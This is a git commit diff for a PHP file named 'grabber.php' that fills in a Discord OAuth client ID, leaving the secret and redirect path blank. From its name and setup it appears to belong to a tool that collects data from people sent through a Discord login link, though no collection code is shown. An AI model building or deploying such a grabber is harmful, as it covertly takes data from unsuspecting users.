41bde33e3908eea2539b7fde6f11e39466159ea0
oniichan-ip <68448377+oniichan-ip@users.noreply.github.com>
2020-07-17 18:31:12 -0400

    Update grabber.php

--- grabber.php
+++ grabber.php
@@ -2,7 +2,7 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
+$client_id     = "733811189653438495"; //CLIENT ID HERE
 $client_secret = ""; //CLIENT SECRET HERE
 $redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
 
